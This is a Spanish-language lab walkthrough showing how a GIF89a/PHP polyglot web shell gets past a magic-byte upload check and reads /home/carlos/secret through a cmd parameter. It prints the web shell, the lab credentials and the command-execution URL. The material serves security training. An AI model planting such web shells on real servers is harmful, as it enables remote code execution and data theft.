# 📤 Ejecución remota de código vía web shell polyglot

## 📄 Descripción del laboratorio

El laboratorio implementa una validación más estricta en la subida de avatares: no solo comprueba la extensión del archivo, sino que también inspecciona los **magic bytes iniciales** para verificar que el archivo sea realmente una imagen.

A pesar de esta protección, es posible lograr **Remote Code Execution (RCE)** subiendo un **archivo polyglot**, es decir, un archivo que sea válido tanto como imagen como como script PHP.

El objetivo es:

* Subir una **web shell PHP polyglot**.
* Ejecutarla para leer el archivo:

```
/home/carlos/secret
```

* Enviar dicho secreto mediante el botón del banner para completar el laboratorio.

Credenciales de prueba:

```
wiener:peter
```



## 📚 Teoría

Cuando una aplicación valida archivos mediante **magic bytes**, ya no basta con:

* Cambiar la extensión del archivo.
* Manipular el encabezado **Content-Type**.

Por ejemplo:

* GIF comienza con:

```
GIF89a
```

* JPEG comienza con:

```
\xFF\xD8\xFF
```

Si un archivo no comienza con estos bytes característicos, será rechazado aunque tenga una extensión permitida.

### 📌 El problema

El backend:

* Solo comprueba **los primeros bytes del archivo**.
* No valida el **contenido completo**.
* No analiza si existe **código ejecutable posteriormente**.

Aquí es donde entran los **polyglots**.

### 📌 Archivos polyglot

Un polyglot es un archivo que:

* Es válido como **imagen**.
* Y al mismo tiempo válido como **script PHP**.

Ejemplo simple:

```php
GIF89a
<?php system($_GET['cmd']); ?>
```

Funcionamiento:

* La aplicación detecta `GIF89a` → acepta el archivo como imagen.
* PHP ignora el texto inicial.
* El código PHP se ejecuta cuando el archivo se solicita desde el navegador.

Resultado: **bypass de validación + ejecución remota de código**.



## 📝 Práctica

### 🎯 Objetivo

Leer el archivo:

```
/home/carlos/secret
```



### 1️⃣ Iniciar sesión

Accedemos a la aplicación con las credenciales:

```
wiener:peter
```

Luego navegamos a:

**My Account → Upload avatar**



### 2️⃣ Confirmar la validación por magic bytes

Intentamos subir una web shell PHP simple:

```php
<?php system($_GET['cmd']); ?>
```

<img width="719" height="137" alt="image" src="https://github.com/user-attachments/assets/7c17bedf-a65a-4619-b242-b88c58a5f33f" />
<br>

Resultado:

El servidor rechaza el archivo indicando que **no es una imagen válida**.

Esto confirma que existe **validación por contenido (magic bytes)**.



### 3️⃣ Crear el archivo polyglot

Creamos un archivo con el siguiente contenido:

```php
GIF89a
<?php system($_GET['cmd']); ?>
```

`GIF89a` corresponde a los **magic bytes de un archivo GIF válido**.

Guardamos el archivo como:

```
shell.php
```



### 4️⃣ Subir el archivo polyglot

Subimos el archivo como avatar.

<img width="1296" height="713" alt="image" src="https://github.com/user-attachments/assets/7ad88e4c-d13a-42cc-97d9-5e584d7eff37" />
<br>

Resultado:

* El servidor detecta `GIF89a` al inicio.
* El archivo pasa la validación como imagen.
* La subida se completa correctamente.



### 5️⃣ Leer el secreto

Una vez subido el archivo, accedemos a la siguiente URL:

```
/files/avatars/shell.php?cmd=cat /home/carlos/secret
```

El servidor ejecuta el comando y devuelve el contenido del archivo.
